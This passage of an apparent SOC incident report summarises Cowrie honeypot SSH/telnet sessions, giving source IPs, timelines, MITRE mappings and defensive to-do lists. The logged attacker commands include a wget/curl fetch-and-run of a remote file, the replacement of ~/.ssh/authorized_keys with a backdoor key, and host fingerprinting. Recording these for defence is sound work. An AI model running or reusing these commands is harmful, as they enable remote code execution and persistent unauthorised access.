| `2026-09-05 07:45:05` | `cowrie.session.connect` |
| `2026-09-05 07:45:05` | `cowrie.client.version` |
| `2026-09-05 07:45:05` | `cowrie.client.kex` |
| `2026-09-05 07:45:07` | `cowrie.login.success` |
| `2026-09-05 07:45:08` | `cowrie.session.params` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.success` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.command.input` |
| `2026-09-05 07:45:08` | `cowrie.log.closed` |
| `2026-09-05 07:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c56aa880b9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:47 |
| **Last Seen** | 2026-09-05 07:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:47:23` | `cowrie.session.connect` |
| `2026-09-05 07:47:23` | `cowrie.client.version` |
| `2026-09-05 07:47:23` | `cowrie.client.kex` |
| `2026-09-05 07:47:24` | `cowrie.login.success` |
| `2026-09-05 07:47:25` | `cowrie.session.params` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.success` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.command.input` |
| `2026-09-05 07:47:25` | `cowrie.log.closed` |
| `2026-09-05 07:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3493331ce90

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]216` |
| **First Seen** | 2026-09-05 07:49 |
| **Last Seen** | 2026-09-05 07:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:49:01` | `cowrie.session.connect` |
| `2026-09-05 07:49:01` | `cowrie.client.version` |
| `2026-09-05 07:49:01` | `cowrie.client.kex` |
| `2026-09-05 07:49:02` | `cowrie.login.success` |
| `2026-09-05 07:49:03` | `cowrie.session.params` |
| `2026-09-05 07:49:03` | `cowrie.command.input` |
| `2026-09-05 07:49:03` | `cowrie.command.failed` |
| `2026-09-05 07:49:03` | `cowrie.log.closed` |
| `2026-09-05 07:49:04` | `cowrie.session.params` |
| `2026-09-05 07:49:04` | `cowrie.command.input` |
| `2026-09-05 07:49:04` | `cowrie.session.file_download` |
| `2026-09-05 07:49:04` | `cowrie.log.closed` |
| `2026-09-05 07:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]216` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5212c1cbc1dd

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]216` |
| **First Seen** | 2026-09-05 07:49 |
| **Last Seen** | 2026-09-05 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:49:05` | `cowrie.session.connect` |
| `2026-09-05 07:49:05` | `cowrie.client.version` |
| `2026-09-05 07:49:05` | `cowrie.client.kex` |
| `2026-09-05 07:49:06` | `cowrie.login.success` |
| `2026-09-05 07:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]216` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db3fecf4413

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]216` |
| **First Seen** | 2026-09-05 07:49 |
| **Last Seen** | 2026-09-05 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:49:06` | `cowrie.session.connect` |
| `2026-09-05 07:49:06` | `cowrie.client.version` |
| `2026-09-05 07:49:07` | `cowrie.client.kex` |
| `2026-09-05 07:49:07` | `cowrie.login.success` |
| `2026-09-05 07:49:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]216` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9feca5400c0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:50 |
| **Last Seen** | 2026-09-05 07:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:50:02` | `cowrie.session.connect` |
| `2026-09-05 07:50:02` | `cowrie.client.version` |
| `2026-09-05 07:50:02` | `cowrie.client.kex` |
| `2026-09-05 07:50:03` | `cowrie.login.success` |
| `2026-09-05 07:50:04` | `cowrie.session.params` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.success` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:04` | `cowrie.command.input` |
| `2026-09-05 07:50:05` | `cowrie.log.closed` |
| `2026-09-05 07:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea86c1612be6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:52 |
| **Last Seen** | 2026-09-05 07:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:52:25` | `cowrie.session.connect` |
| `2026-09-05 07:52:25` | `cowrie.client.version` |
| `2026-09-05 07:52:25` | `cowrie.client.kex` |
| `2026-09-05 07:52:26` | `cowrie.login.success` |
| `2026-09-05 07:52:28` | `cowrie.session.params` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.success` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.command.input` |
| `2026-09-05 07:52:28` | `cowrie.log.closed` |
| `2026-09-05 07:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46bf19806980

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 07:52 |
| **Last Seen** | 2026-09-05 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:52:54` | `cowrie.session.connect` |
| `2026-09-05 07:52:54` | `cowrie.client.version` |
| `2026-09-05 07:52:54` | `cowrie.client.kex` |
| `2026-09-05 07:52:55` | `cowrie.login.success` |
| `2026-09-05 07:52:55` | `cowrie.direct-tcpip.request` |
| `2026-09-05 07:52:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 07:52:56` | `cowrie.direct-tcpip.data` |
| `2026-09-05 07:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59208855b01c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:54 |
| **Last Seen** | 2026-09-05 07:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:54:43` | `cowrie.session.connect` |
| `2026-09-05 07:54:44` | `cowrie.client.version` |
| `2026-09-05 07:54:44` | `cowrie.client.kex` |
| `2026-09-05 07:54:45` | `cowrie.login.success` |
| `2026-09-05 07:54:46` | `cowrie.session.params` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.success` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.command.input` |
| `2026-09-05 07:54:46` | `cowrie.log.closed` |
| `2026-09-05 07:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d0db8d70d03

| Field | Detail |
|---|---|
| **Source IP** | `16.5.0[.]236` |
| **First Seen** | 2026-09-05 07:56 |
| **Last Seen** | 2026-09-05 07:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:56:37` | `cowrie.session.connect` |
| `2026-09-05 07:56:38` | `cowrie.telnet.option` |
| `2026-09-05 07:56:38` | `cowrie.login.success` |
| `2026-09-05 07:56:38` | `cowrie.session.params` |
| `2026-09-05 07:56:38` | `cowrie.telnet.option` |
| `2026-09-05 07:56:38` | `cowrie.telnet.option` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.failed` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.success` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.failed` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.success` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.failed` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.success` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.command.failed` |
| `2026-09-05 07:56:38` | `cowrie.command.input` |
| `2026-09-05 07:56:38` | `cowrie.log.closed` |
| `2026-09-05 07:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `16.5.0[.]236` to AbuseIPDB if not already reported
- [ ] Block `16.5.0[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebe4b17266e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:57 |
| **Last Seen** | 2026-09-05 07:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:57:03` | `cowrie.session.connect` |
| `2026-09-05 07:57:03` | `cowrie.client.version` |
| `2026-09-05 07:57:03` | `cowrie.client.kex` |
| `2026-09-05 07:57:03` | `cowrie.login.success` |
| `2026-09-05 07:57:05` | `cowrie.session.params` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.success` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.command.input` |
| `2026-09-05 07:57:05` | `cowrie.log.closed` |
| `2026-09-05 07:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-828e83ded922

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:16` | `cowrie.session.connect` |
| `2026-09-05 07:59:16` | `cowrie.client.version` |
| `2026-09-05 07:59:16` | `cowrie.client.kex` |
| `2026-09-05 07:59:17` | `cowrie.login.success` |
| `2026-09-05 07:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af4ffa7f40b4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:16` | `cowrie.session.connect` |
| `2026-09-05 07:59:16` | `cowrie.client.version` |
| `2026-09-05 07:59:16` | `cowrie.client.kex` |
| `2026-09-05 07:59:17` | `cowrie.login.success` |
| `2026-09-05 07:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b984eb182082

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:19` | `cowrie.session.connect` |
| `2026-09-05 07:59:20` | `cowrie.client.version` |
| `2026-09-05 07:59:20` | `cowrie.client.kex` |
| `2026-09-05 07:59:21` | `cowrie.login.success` |
| `2026-09-05 07:59:22` | `cowrie.session.params` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.success` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:22` | `cowrie.command.input` |
| `2026-09-05 07:59:23` | `cowrie.log.closed` |
| `2026-09-05 07:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8940af7ac156

| Field | Detail |
|---|---|
| **Source IP** | `223.233.86[.]187` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:25` | `cowrie.session.connect` |
| `2026-09-05 07:59:25` | `cowrie.client.version` |
| `2026-09-05 07:59:25` | `cowrie.client.kex` |
| `2026-09-05 07:59:26` | `cowrie.login.success` |
| `2026-09-05 07:59:27` | `cowrie.session.params` |
| `2026-09-05 07:59:27` | `cowrie.command.input` |
| `2026-09-05 07:59:27` | `cowrie.command.failed` |
| `2026-09-05 07:59:27` | `cowrie.log.closed` |
| `2026-09-05 07:59:28` | `cowrie.session.params` |
| `2026-09-05 07:59:28` | `cowrie.command.input` |
| `2026-09-05 07:59:29` | `cowrie.session.file_download` |
| `2026-09-05 07:59:29` | `cowrie.log.closed` |
| `2026-09-05 07:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.86[.]187` to AbuseIPDB if not already reported
- [ ] Block `223.233.86[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-919e032c90c6

| Field | Detail |
|---|---|
| **Source IP** | `223.233.86[.]187` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:29` | `cowrie.session.connect` |
| `2026-09-05 07:59:29` | `cowrie.client.version` |
| `2026-09-05 07:59:29` | `cowrie.client.kex` |
